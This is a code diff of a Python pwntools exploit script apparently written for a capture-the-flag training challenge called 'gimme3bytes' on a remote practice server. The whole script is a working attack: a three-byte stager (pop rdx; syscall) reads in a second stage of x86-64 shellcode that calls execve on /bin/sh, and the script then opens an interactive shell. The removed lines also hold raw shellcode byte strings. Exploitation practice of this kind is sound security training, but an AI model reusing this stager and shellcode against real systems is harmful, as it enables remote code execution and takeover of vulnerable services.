@@ -1,22 +1,36 @@
 import pwn
 
 pwn.context.terminal = ['gnome-terminal', '-e']
+pwn.context.arch = 'amd64'
 
 r = pwn.remote("training.jinblack.it", 2004)
 
-# r = pwn.gdb.debug('./gimme3bytes')
 # r = pwn.process('./gimme3bytes')
 
 # pwn.gdb.attach(r, """c
 
 # """)
 
-# input('wait')
+input('wait')
 
-r.send(b'\x5A\x0F\x05')
+load_shell_code = pwn.asm('''
+    pop rdx
+    syscall
+''')
 
-# r.send(b'\x90' * 90 + b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')
+shell_code = pwn.asm('''
+    jmp end
+    start:
+    pop rdi
+    mov rax, 0x3b
+    lea rsi, [rdi + 0x7]
+    mov rdx, rsi
+    syscall
+    end:
+    call start
+''') + b'/bin/sh' + b'\x00' * 8
 
-r.send(b'\xcc' * 3 + b'\xE8\x00\x00\x00\x00\x5F\x48\xC7\xC0\x3B\x00\x00\x00\x48\x83\xC7\x30\x48\x89\xFE\x48\x83\xC6\x09\x48\x89\xF2\x0F\x05' + b'\x00' * 24 + b'/bin/sh\x00' + b'\x00' * 20)
+
+r.send(load_shell_code + shell_code)
 
 r.interactive()
